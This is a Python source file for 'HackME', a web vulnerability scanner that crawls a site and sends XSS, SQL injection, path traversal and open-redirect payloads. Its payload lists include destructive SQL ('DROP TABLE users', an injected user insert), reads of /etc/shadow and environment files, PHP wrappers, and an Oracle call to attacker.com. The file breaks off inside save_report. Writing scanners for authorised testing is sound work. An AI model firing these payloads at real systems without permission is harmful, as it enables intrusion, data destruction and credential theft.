#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    HackME - Web Vulnerability Scanner v2.0                  ║
║                        Developed by Meelan Neupane                          ║
║                  For Authorized Penetration Testing ONLY                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
Scans for: XSS • SQL Injection • Path Traversal
"""

import sys, os, re, time, json, random, string, threading, queue, argparse
import urllib3, copy, hashlib
from urllib.parse  import (urljoin, urlparse, urlencode, parse_qs,
                            urlunparse, quote, unquote)
from datetime import datetime
from collections import defaultdict

# ── Dependency check ──────────────────────────────────────────────────────────
_missing = []
try:    import requests
except: _missing.append("requests")
try:    from bs4 import BeautifulSoup
except: _missing.append("beautifulsoup4")
try:    from colorama import init as _cinit, Fore, Back, Style; _cinit(autoreset=True)
except: _missing.append("colorama")
if _missing:
    print(f"[!] Missing: {', '.join(_missing)}")
    print(f"    pip install {' '.join(_missing)}")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════
VERSION   = "2.0.0"
AUTHOR    = "Meelan Neupane"
TOOL_NAME = "HackME"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

TIMEOUT   = 12
MAX_DEPTH = 3
MAX_URLS  = 300
THREADS   = 8

# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOADS
# ══════════════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    # Reflected basics
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Image / event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    # SVG
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert`1`>",
    "<svg><script>alert(1)</script></svg>",
    # Body / form events
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<input onmouseover=alert(1)>",
    "<select onmouseover=alert(1)><option>X",
    "<textarea onfocus=alert(1) autofocus>",
    # Iframe
    "<iframe src=javascript:alert(1)>",
    "<iframe onload=alert(1) src=data:text/html,>",
    # Details / marquee
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>X</marquee>",
    # Media
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    # Script variations
    "';alert(1);//",
    '";alert(1);//',
    "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # Encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Template injection probes
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    # CSS injection
    "<style>*{background:url(javascript:alert(1))}</style>",
    # DOM-based hints
    'javascript:/*--></title></style></textarea></script>'
    '</xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    # Button form
    '<form><button formaction=javascript:alert(1)>click</button></form>',
    # href / anchor
    '<a href=javascript:alert(1)>click</a>',
    # Object
    '<object data=javascript:alert(1)>',
    # Math
    '<math><mi//xlink:href="data:x,<script>alert(4)</script>">',
]

SQLI_PAYLOADS = [
    # Error-based
    "'",
    '"',
    "``",
    "\\",
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR (1=1--",
    "' OR 'x'='x",
    "1 OR 1=1",
    "' OR ''='",
    # Admin bypass
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1/*",
    "') or ('a'='a",
    # Union-based
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
    "' UNION ALL SELECT NULL--",
    # Time-based blind (MySQL)
    "' AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT SLEEP(5)--",
    # Time-based blind (MSSQL)
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    # Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users(username,password) VALUES ('hacked','hacked')--",
    # Error extraction
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x "
    "FROM information_schema.tables GROUP BY x)a)--",
    # PostgreSQL
    "' AND 1=CAST((SELECT version()) AS int)--",
    "'; SELECT pg_sleep(5)--",
    # SQLite
    "' AND 1=CAST(sqlite_version() AS int)--",
    # Oracle
    "' AND 1=utl_http.request('http://attacker.com/')--",
    "' OR 1=1 FROM dual--",
]

SQLI_ERROR_SIGNATURES = [
    r"sql syntax.*?mysql",
    r"warning.*?mysql_",
    r"unclosed quotation mark",
    r"you have an error in your sql",
    r"microsoft ole db provider",
    r"odbc drivers error",
    r"sqlite_exception",
    r"supplied argument is not a valid mysql",
    r"pg::syntaxerror",
    r"org\.postgresql",
    r"com\.microsoft\.sqlserver",
    r"invalid query",
    r"sql command not properly ended",
    r"incorrect syntax near",
    r"unexpected end of sql command",
    r"jdbc\b",
    r"sqlstate\[",
    r"native client.*?sql",
    r"syntax error.*?sql",
    r"ora-\d{5}",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"division by zero",
    r"integrity constraint violation",
    r"data type mismatch",
    r"mysql server version.*?right syntax",
]

PATH_TRAVERSAL_PAYLOADS = [
    # Unix — bare
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    # Unix — URL encoded single
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    # Double URL encoded
    "..%252Fetc%252Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Mixed encoding
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Null bytes
    "../etc/passwd%00",
    "../etc/passwd%00.html",
    "../etc/passwd%00.jpg",
    # Absolute paths
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "/proc/self/cmdline",
    # Other sensitive Unix files
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../../root/.bash_history",
    # Windows paths
    "..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    # PHP wrappers
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://input",
    "expect://id",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    # Dots obfuscation
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    "..././..././..././etc/passwd",
]

PATH_TRAVERSAL_SIGNATURES = [
    r"root:.*?:0:0:",
    r"root:x:0:0",
    r"/bin/bash",
    r"/bin/sh",
    r"daemon:.*?:/",
    r"nobody:.*?:/",
    r"\[boot loader\]",
    r"\[operating systems\]",
    r"HTTP_USER_AGENT",
    r"DOCUMENT_ROOT",
    r"SERVER_SOFTWARE",
    r"Linux version \d",
    r"Windows NT",
    r"\[fonts\]",          # win.ini
    r"\[extensions\]",    # win.ini
    r"for 16-bit app support",
]

# ══════════════════════════════════════════════════════════════════════════════
#  COLOUR / BANNER HELPERS
# ══════════════════════════════════════════════════════════════════════════════

R  = Fore.RED    + Style.BRIGHT
G  = Fore.GREEN  + Style.BRIGHT
Y  = Fore.YELLOW + Style.BRIGHT
B  = Fore.BLUE   + Style.BRIGHT
M  = Fore.MAGENTA+ Style.BRIGHT
C  = Fore.CYAN   + Style.BRIGHT
W  = Fore.WHITE  + Style.BRIGHT
DIM = Style.DIM
RST = Style.RESET_ALL

def cprint(msg, color=W, end="\n"):
    print(color + msg + RST, end=end)

def ok(msg):    cprint(f"  [✓] {msg}", G)
def warn(msg):  cprint(f"  [!] {msg}", Y)
def err(msg):   cprint(f"  [✗] {msg}", R)
def info(msg):  cprint(f"  [•] {msg}", C)
def vuln(msg):  cprint(f"\n  [VULN] {msg}", R)
def sep():      cprint("─" * 78, DIM)

BANNER = f"""
{R}  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███╗   ███╗███████╗
{R}  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝████╗ ████║██╔════╝
{R}  ███████║███████║██║     █████╔╝ ██╔████╔██║█████╗
{R}  ██╔══██║██╔══██║██║     ██╔═██╗ ██║╚██╔╝██║██╔══╝
{R}  ██║  ██║██║  ██║╚██████╗██║  ██╗██║ ╚═╝ ██║███████╗
{R}  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝{RST}
{Y}               Web Vulnerability Scanner v{VERSION}{RST}
{C}              Developed by {AUTHOR}{RST}
{DIM}         XSS  •  SQL Injection  •  Path Traversal{RST}
{R}      ⚠  For Authorized Security Testing ONLY  ⚠{RST}
"""

# ══════════════════════════════════════════════════════════════════════════════
#  RESULT STRUCTURES
# ══════════════════════════════════════════════════════════════════════════════

class VulnResult:
    def __init__(self, vuln_type, url, param, payload, evidence, severity="HIGH"):
        self.vuln_type  = vuln_type
        self.url        = url
        self.param      = param
        self.payload    = payload
        self.evidence   = evidence
        self.severity   = severity
        self.timestamp  = datetime.now().isoformat()

    def to_dict(self):
        return {k: v for k, v in self.__dict__.items()}

# ══════════════════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════════════════════

class Session:
    def __init__(self, proxy=None, cookies=None, headers=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        if headers:  self.session.headers.update(headers)
        if cookies:  self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def get(self, url, **kw):
        try:
            return self.session.get(url, timeout=TIMEOUT, allow_redirects=True, **kw)
        except Exception:
            return None

    def post(self, url, data=None, **kw):
        try:
            return self.session.post(url, data=data, timeout=TIMEOUT,
                                     allow_redirects=True, **kw)
        except Exception:
            return None

# ══════════════════════════════════════════════════════════════════════════════
#  CRAWLER  (Burp/ZAP-style spider)
# ══════════════════════════════════════════════════════════════════════════════

class Crawler:
    def __init__(self, base_url, session, depth=MAX_DEPTH,
                 max_urls=MAX_URLS, callback=None):
        parsed          = urlparse(base_url)
        self.base_url   = base_url
        self.base_domain= parsed.netloc
        self.base_scheme= parsed.scheme
        self.session    = session
        self.depth      = depth
        self.max_urls   = max_urls
        self.callback   = callback  # fn(msg, level) for live output
        self.visited    = set()
        self.endpoints  = []        # {"url", "method", "params", "form_data"}
        self._lock      = threading.Lock()
        self._queue     = queue.Queue()

    def _log(self, msg, level="info"):
        if self.callback:
            self.callback(msg, level)

    def _same_domain(self, url):
        return urlparse(url).netloc == self.base_domain

    def _normalise(self, url, base):
        url = urljoin(base, url.split("#")[0].strip())
        p   = urlparse(url)
        if p.scheme not in ("http", "https"):
            return None
        if not self._same_domain(url):
            return None
        return url

    def _extract_links(self, url, soup):
        links = set()
        for tag in soup.find_all("a", href=True):
            u = self._normalise(tag["href"], url)
            if u:
                links.add(u)
        for tag in soup.find_all(["link", "script"], src=True):
            u = self._normalise(tag.get("src", ""), url)
            if u:
                links.add(u)
        # JS strings that look like paths
        for script in soup.find_all("script"):
            txt = script.get_text()
            for m in re.findall(r'["\'](/[^"\'<>]+)["\']', txt):
                u = self._normalise(m, url)
                if u:
                    links.add(u)
        return links

    def _extract_endpoints(self, url, soup, resp):
        """Pull out all testable endpoints from this page."""
        endpoints = []

        # 1. URL parameters
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        if qs:
            endpoints.append({
                "url": url, "method": "GET",
                "params": qs, "form_data": None,
                "source": "url_param",
            })

        # 2. HTML Forms
        for form in soup.find_all("form"):
            action  = form.get("action", url)
            method  = (form.get("method", "get") or "get").upper()
            action  = self._normalise(action, url) or url
            inputs  = {}
            for inp in form.find_all(["input","textarea","select"]):
                name = inp.get("name","").strip()
                if name:
                    inputs[name] = inp.get("value","") or ""
            if inputs:
                endpoints.append({
                    "url": action, "method": method,
                    "params": inputs, "form_data": inputs if method=="POST" else None,
                    "source": "form",
                })

        # 3. JSON endpoints hinted in JS
        ct = resp.headers.get("Content-Type","")
        if "json" in ct:
            endpoints.append({
                "url": url, "method": "GET",
                "params": {}, "form_data": None,
                "source": "json_endpoint",
            })

        return endpoints

    def crawl(self):
        self._log(f"🕷  Starting spider on: {self.base_url}", "info")
        self._queue.put((self.base_url, 0))
        self.visited.add(self.base_url)

        while not self._queue.empty():
            if len(self.visited) >= self.max_urls:
                self._log(f"   Max URLs ({self.max_urls}) reached, stopping spider.", "warn")
                break
            url, depth = self._queue.get()
            self._log(f"   [Spider] {url}", "info")

            resp = self.session.get(url)
            if not resp:
                continue

            ct = resp.headers.get("Content-Type", "")
            if "html" not in ct and "xml" not in ct:
                continue

            try:
                soup = BeautifulSoup(resp.text, "html.parser")
            except Exception:
                continue

            # Collect endpoints
            eps = self._extract_endpoints(url, soup, resp)
            with self._lock:
                self.endpoints.extend(eps)

            if depth < self.depth:
                for link in self._extract_links(url, soup):
                    if link not in self.visited:
                        self.visited.add(link)
                        self._queue.put((link, depth + 1))

        self._log(f"✅  Spider done — {len(self.visited)} pages, "
                  f"{len(self.endpoints)} endpoints found.", "ok")
        return self.endpoints

# ══════════════════════════════════════════════════════════════════════════════
#  BASE SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class BaseScanner:
    def __init__(self, session, callback=None):
        self.session  = session
        self.callback = callback
        self.results  = []

    def _log(self, msg, level="info"):
        if self.callback:
            self.callback(msg, level)

    def _inject_param(self, url, param, payload):
        """Return URL with one param replaced by payload."""
        p  = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[param] = [payload]
        new_q = urlencode(qs, doseq=True)
        return urlunparse(p._replace(query=new_q))

    def _baseline(self, url, method, params, form_data):
        """Fetch the original response for comparison."""
        if method == "POST":
            return self.session.post(url, data=form_data)
        return self.session.get(url, params=params)

# ══════════════════════════════════════════════════════════════════════════════
#  XSS SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class XSSScanner(BaseScanner):
    """Tests each parameter for reflected / stored XSS."""

    def scan_endpoint(self, endpoint):
        url       = endpoint["url"]
        method    = endpoint["method"]
        params    = endpoint["params"]
        form_data = endpoint["form_data"]

        # Build param list to test
        param_names = list(params.keys()) if params else []
        if not param_names:
            return

        # Use a canary to detect reflection first (cheap)
        canary = "xss" + "".join(random.choices(string.ascii_lowercase, k=5))

        for pname in param_names:
            # Canary check
            test_params = dict(params)
            test_params[pname] = canary
            if method == "POST":
                r = self.session.post(url, data=test_params)
            else:
                r = self.session.get(url, params=test_params)

            if not r:
                continue
            reflects = canary.lower() in r.text.lower()

            # Test payloads
            for payload in XSS_PAYLOADS:
                test_p = dict(params)
                test_p[pname] = payload
                if method == "POST":
                    resp = self.session.post(url, data=test_p)
                else:
                    resp = self.session.get(url, params=test_p)
                if not resp:
                    continue

                hit = self._detect_xss(resp.text, payload)
                if hit:
                    evidence = hit
                    res = VulnResult(
                        vuln_type="Cross-Site Scripting (XSS)",
                        url=url,
                        param=pname,
                        payload=payload,
                        evidence=evidence,
                        severity="HIGH",
                    )
                    self.results.append(res)
                    self._log(
                        f"[XSS] Vulnerable: {url} | param={pname} | "
                        f"payload={payload[:60]}",
                        "vuln"
                    )
                    break  # one confirmed hit per param is enough

    def _detect_xss(self, body, payload):
        """Returns evidence string if payload is reflected/executed."""
        # Direct reflection (case-insensitive)
        if payload.lower() in body.lower():
            return f"Payload reflected verbatim in response"
        # Partial reflection checks
        markers = ["<script", "onerror=", "onload=", "onfocus=",
                   "alert(", "javascript:", "<svg", "<img", "<iframe"]
        for m in markers:
            if m in payload.lower() and m in body.lower():
                return f"Dangerous HTML fragment '{m}' reflected in response"
        # Template injection
        if "{{7*7}}" in payload and "49" in body:
            return "Template injection confirmed: {{7*7}} → 49"
        if "${7*7}" in payload and "49" in body:
            return "Template injection confirmed: ${7*7} → 49"
        return None

    def scan(self, endpoints):
        self._log("🔍 Starting XSS scan...", "info")
        for ep in endpoints:
            self.scan_endpoint(ep)
        self._log(f"   XSS scan complete — {len(self.results)} issues found.", "ok")
        return self.results

# ══════════════════════════════════════════════════════════════════════════════
#  SQL INJECTION SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class SQLiScanner(BaseScanner):
    """Tests for error-based, boolean-based, and time-based SQLi."""

    def scan_endpoint(self, endpoint):
        url       = endpoint["url"]
        method    = endpoint["method"]
        params    = endpoint["params"]
        form_data = endpoint["form_data"]
        param_names = list(params.keys()) if params else []
        if not param_names:
            return

        for pname in param_names:
            # 1. Baseline response time & body
            orig_params = dict(params)
            if method == "POST":
                base_r = self.session.post(url, data=orig_params)
            else:
                base_r = self.session.get(url, params=orig_params)
            if not base_r:
                continue
            base_body = base_r.text

            found = False
            for payload in SQLI_PAYLOADS:
                if found:
                    break
                test_p = dict(params)
                test_p[pname] = payload

                t0 = time.time()
                if method == "POST":
                    resp = self.session.post(url, data=test_p)
                else:
                    resp = self.session.get(url, params=test_p)
                elapsed = time.time() - t0

                if not resp:
                    continue

                # a) Error-based detection
                evidence = self._detect_error(resp.text)
                if evidence:
                    res = VulnResult(
                        vuln_type="SQL Injection (Error-Based)",
                        url=url, param=pname, payload=payload,
                        evidence=evidence, severity="CRITICAL",
                    )
                    self.results.append(res)
                    self._log(
                        f"[SQLi-Error] Vulnerable: {url} | param={pname} | "
                        f"payload={payload[:60]}",
                        "vuln"
                    )
                    found = True
                    break

                # b) Time-based detection (SLEEP / WAITFOR payloads)
                if ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()
                        or "pg_sleep" in payload):
                    if elapsed >= 4.5:
                        res = VulnResult(
                            vuln_type="SQL Injection (Time-Based Blind)",
                            url=url, param=pname, payload=payload,
                            evidence=f"Response delayed {elapsed:.1f}s (sleep payload)",
                            severity="CRITICAL",
                        )
                        self.results.append(res)
                        self._log(
                            f"[SQLi-Time] Vulnerable: {url} | param={pname} | "
                            f"delay={elapsed:.1f}s",
                            "vuln"
                        )
                        found = True
                        break

                # c) Boolean-based detection
                if evidence := self._detect_boolean(base_body, resp.text, payload):
                    res = VulnResult(
                        vuln_type="SQL Injection (Boolean-Based Blind)",
                        url=url, param=pname, payload=payload,
                        evidence=evidence, severity="HIGH",
                    )
                    self.results.append(res)
                    self._log(
                        f"[SQLi-Bool] Possible: {url} | param={pname} | "
                        f"payload={payload[:60]}",
                        "vuln"
                    )
                    found = True
                    break

    def _detect_error(self, body):
        body_l = body.lower()
        for pattern in SQLI_ERROR_SIGNATURES:
            if re.search(pattern, body_l):
                return f"SQL error signature matched: '{pattern}'"
        return None

    def _detect_boolean(self, baseline, response, payload):
        """Detect significant content change suggesting boolean injection."""
        if not baseline or not response:
            return None
        # True conditions vs false
        if "OR 1=1" in payload.upper() or "OR '1'='1'" in payload.upper():
            ratio = len(response) / (len(baseline) + 1)
            if ratio > 1.3 or ratio < 0.7:
                return (f"Response length changed significantly with payload "
                        f"(baseline={len(baseline)}, payload={len(response)})")
        return None

    def scan(self, endpoints):
        self._log("🔍 Starting SQL Injection scan...", "info")
        for ep in endpoints:
            self.scan_endpoint(ep)
        self._log(f"   SQLi scan complete — {len(self.results)} issues found.", "ok")
        return self.results

# ══════════════════════════════════════════════════════════════════════════════
#  PATH TRAVERSAL SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class PathTraversalScanner(BaseScanner):
    """Tests URL params and file-like params for directory traversal."""

    # Parameters that commonly serve files
    FILE_PARAM_HINTS = {
        "file", "path", "page", "include", "template", "load", "doc",
        "document", "filename", "dir", "folder", "module", "view",
        "name", "layout", "theme", "lang", "locale", "url", "src",
        "source", "img", "image", "photo", "content", "resource",
        "show", "open", "read", "get", "fetch",
    }

    def _is_file_param(self, name):
        return name.lower() in self.FILE_PARAM_HINTS

    def scan_endpoint(self, endpoint):
        url       = endpoint["url"]
        method    = endpoint["method"]
        params    = endpoint["params"]
        form_data = endpoint["form_data"]
        param_names = list(params.keys()) if params else []
        if not param_names:
            return

        for pname in param_names:
            # Prioritise file-like params but still test all
            priority = 1.0 if self._is_file_param(pname) else 0.3
            payloads = PATH_TRAVERSAL_PAYLOADS
            if priority < 0.5:
                payloads = PATH_TRAVERSAL_PAYLOADS[:12]  # Quick scan only

            found = False
            for payload in payloads:
                if found:
                    break
                test_p = dict(params)
                test_p[pname] = payload

                if method == "POST":
                    resp = self.session.post(url, data=test_p)
                else:
                    resp = self.session.get(url, params=test_p)

                if not resp or resp.status_code >= 500:
                    continue

                evidence = self._detect(resp.text, resp.status_code)
                if evidence:
                    res = VulnResult(
                        vuln_type="Path Traversal / LFI",
                        url=url, param=pname, payload=payload,
                        evidence=evidence, severity="CRITICAL",
                    )
                    self.results.append(res)
                    self._log(
                        f"[PathTraversal] Vulnerable: {url} | param={pname} | "
                        f"payload={payload}",
                        "vuln"
                    )
                    found = True

    def _detect(self, body, status):
        for sig in PATH_TRAVERSAL_SIGNATURES:
            if re.search(sig, body, re.IGNORECASE):
                return f"File content signature found: '{sig}'"
        # PHP wrapper base64 data
        if re.search(r"^[A-Za-z0-9+/]{40,}={0,2}$", body.strip()):
            return "Possible PHP filter wrapper — base64 data returned"
        return None

    def scan(self, endpoints):
        self._log("🔍 Starting Path Traversal scan...", "info")
        for ep in endpoints:
            self.scan_endpoint(ep)
        self._log(f"   Path Traversal scan complete — {len(self.results)} issues found.", "ok")
        return self.results

# ══════════════════════════════════════════════════════════════════════════════
#  ADDITIONAL SCANNERS
# ══════════════════════════════════════════════════════════════════════════════

class HeaderScanner:
    """Check for missing security headers and information disclosure."""
    SECURITY_HEADERS = {
        "X-Frame-Options":         "Clickjacking protection missing",
        "X-Content-Type-Options":  "MIME-sniffing protection missing",
        "X-XSS-Protection":        "Browser XSS filter not set",
        "Strict-Transport-Security":"HSTS not configured",
        "Content-Security-Policy": "CSP not configured",
        "Referrer-Policy":         "Referrer policy not set",
        "Permissions-Policy":      "Permissions policy not set",
    }
    LEAK_HEADERS = ["Server","X-Powered-By","X-AspNet-Version",
                    "X-AspNetMvc-Version","X-Generator"]

    def scan(self, url, session, callback=None):
        results = []
        resp = session.get(url)
        if not resp:
            return results
        h = resp.headers
        for header, msg in self.SECURITY_HEADERS.items():
            if header not in h:
                results.append(VulnResult(
                    vuln_type="Missing Security Header",
                    url=url, param=header, payload="",
                    evidence=msg, severity="LOW",
                ))
        for leak in self.LEAK_HEADERS:
            if leak in h:
                results.append(VulnResult(
                    vuln_type="Information Disclosure (HTTP Header)",
                    url=url, param=leak, payload="",
                    evidence=f"Header reveals: {h[leak]}",
                    severity="LOW",
                ))
        return results

class OpenRedirectScanner(BaseScanner):
    """Tests URL params for open redirect."""
    PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https:evil.com",
        "%2F%2Fevil.com",
    ]
    HINTS = {"url","redirect","next","redir","return","returnurl","goto",
             "dest","destination","target","link","location","continue"}

    def scan(self, endpoints):
        for ep in endpoints:
            params = ep.get("params") or {}
            for pname in params:
                if pname.lower() in self.HINTS:
                    for p in self.PAYLOADS:
                        test_p = dict(params); test_p[pname] = p
                        resp = self.session.get(ep["url"], params=test_p,
                                                allow_redirects=False)
                        if not resp:
                            continue
                        loc = resp.headers.get("Location","")
                        if "evil.com" in loc or resp.status_code in (301,302,303,307,308):
                            if "evil.com" in loc:
                                self.results.append(VulnResult(
                                    "Open Redirect", ep["url"], pname, p,
                                    f"Redirected to {loc}", "MEDIUM"
                                ))
                                self._log(f"[OpenRedirect] {ep['url']} | param={pname}", "vuln")
                                break
        return self.results

# ══════════════════════════════════════════════════════════════════════════════
#  SCAN ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class ScanEngine:
    MODES = {"xss", "sqli", "path", "full"}

    def __init__(self, target, mode="full", proxy=None, cookies=None,
                 headers=None, depth=MAX_DEPTH, max_urls=MAX_URLS,
                 callback=None, threads=THREADS):
        self.target   = target
        self.mode     = mode.lower()
        self.callback = callback
        self.session  = Session(proxy=proxy, cookies=cookies, headers=headers)
        self.crawler  = Crawler(target, self.session, depth=depth,
                                max_urls=max_urls, callback=callback)
        self.threads  = threads
        self.results  = []
        self.start_ts = None
        self.end_ts   = None

    def _cb(self, msg, level="info"):
        if self.callback:
            self.callback(msg, level)

    def run(self):
        self.start_ts = datetime.now()
        self._cb(f"Target : {self.target}", "info")
        self._cb(f"Mode   : {self.mode.upper()}", "info")
        sep()

        # Step 1: Crawl
        endpoints = self.crawler.crawl()
        if not endpoints:
            self._cb("No testable endpoints found. Trying base URL...", "warn")
            endpoints = [{"url": self.target, "method":"GET",
                          "params":{}, "form_data":None, "source":"manual"}]

        self._cb(f"Endpoints to test: {len(endpoints)}", "info")
        sep()

        # Step 2: Header scan (always)
        hs = HeaderScanner()
        h_res = hs.scan(self.target, self.session, self.callback)
        self.results.extend(h_res)
        if h_res:
            self._cb(f"Security header issues: {len(h_res)}", "warn")

        # Step 3: Vulnerability scanners
        scanners = []
        if self.mode in ("xss",  "full"): scanners.append(("XSS",           XSSScanner))
        if self.mode in ("sqli", "full"): scanners.append(("SQL Injection",  SQLiScanner))
        if self.mode in ("path", "full"): scanners.append(("Path Traversal", PathTraversalScanner))
        if self.mode == "full":           scanners.append(("Open Redirect",  OpenRedirectScanner))

        for name, ScannerCls in scanners:
            self._cb(f"\n{'═'*60}", "dim")
            self._cb(f"  Running {name} scanner...", "info")
            s = ScannerCls(self.session, callback=self.callback)
            r = s.scan(endpoints)
            self.results.extend(r)

        self.end_ts = datetime.now()
        self._cb(f"\n{'═'*60}", "dim")
        self._cb(f"Scan complete in {(self.end_ts-self.start_ts).seconds}s", "ok")
        return self.results

# ══════════════════════════════════════════════════════════════════════════════
#  REPORTING
# ══════════════════════════════════════════════════════════════════════════════

SEVERITY_COLOR = {"CRITICAL": R, "HIGH": Fore.RED, "MEDIUM": Y, "LOW": C}
SEVERITY_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵"}

def print_results(results):
    sep()
    if not results:
        cprint("  No vulnerabilities found.", G)
        sep()
        return

    # Group by severity
    by_sev = defaultdict(list)
    for r in results:
        by_sev[r.severity].append(r)

    cprint(f"\n  ╔══════ VULNERABILITY REPORT ══════╗", R)
    cprint(f"  Total Issues: {len(results)}", W)
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW"]:
        n = len(by_sev[sev])
        if n:
            col = SEVERITY_COLOR.get(sev, W)
            cprint(f"    {SEVERITY_EMOJI[sev]}  {sev:8s}: {n}", col)
    cprint(f"  ╚══════════════════════════════════╝\n", R)

    for sev in ["CRITICAL","HIGH","MEDIUM","LOW"]:
        for res in by_sev[sev]:
            col = SEVERITY_COLOR.get(sev, W)
            cprint(f"  ┌─ {SEVERITY_EMOJI[sev]} [{res.severity}] {res.vuln_type}", col)
            cprint(f"  │  URL      : {res.url}", W)
            cprint(f"  │  Parameter: {res.param}", Y)
            if res.payload:
                cprint(f"  │  Payload  : {res.payload[:80]}", M)
            cprint(f"  │  Evidence : {res.evidence}", C)
            cprint(f"  └─────────────────────────────────────────────────", DIM)

def save_report(results, target, outfile=None):
    if outfile is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
